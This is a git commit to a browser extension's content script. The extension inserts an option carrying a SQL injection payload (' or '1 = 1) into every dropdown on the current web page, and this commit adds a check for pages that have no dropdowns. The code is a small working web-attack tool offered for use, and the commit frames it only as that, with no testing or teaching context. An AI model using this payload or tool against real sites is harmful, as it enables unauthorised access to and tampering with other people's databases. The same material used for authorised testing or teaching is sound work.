e3d4ef5ad37486cfa6cb6435f9ab33ac6dd346d9
retropfilmz <61301467+retropfilmz@users.noreply.github.com>
2021-03-03 12:52:19 -0800

    V0.0.3 Added error checking
    If there are no dropdowns to inject into the script will stop and alert the user rather than trying to insert into nothing.

--- sqlextension/content.js
+++ sqlextension/content.js
@@ -3,12 +3,20 @@
 function dropdownInject(){
   //Gather all the dropdown lists
   var dropdowns = document.getElementsByTagName('select');
+
+  //If there are no dropdowns to inject, stop
+  if (dropdowns.length == 0){
+    alert("There are no dropdowns to inject into.");
+    return;
+  }
+
   //Set injection tactic
   var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
   //Replace dropdown option with injection
   for (var i = 0, l = dropdowns.length; i < l; i++) {
     dropdowns[i].innerHTML = injectionString + dropdowns[i].innerHTML;
   }
+  alert("Injected");
 }
 
 
@@ -17,7 +25,6 @@ chrome.runtime.onMessage.addListener(
     //alert(request.message);
     if (request.message === "inject_to_dropdowns"){
       dropdownInject();
-      alert("Injected");
       chrome.runtime.sendMessage({"message": "Injection Completed"})
     }
   }
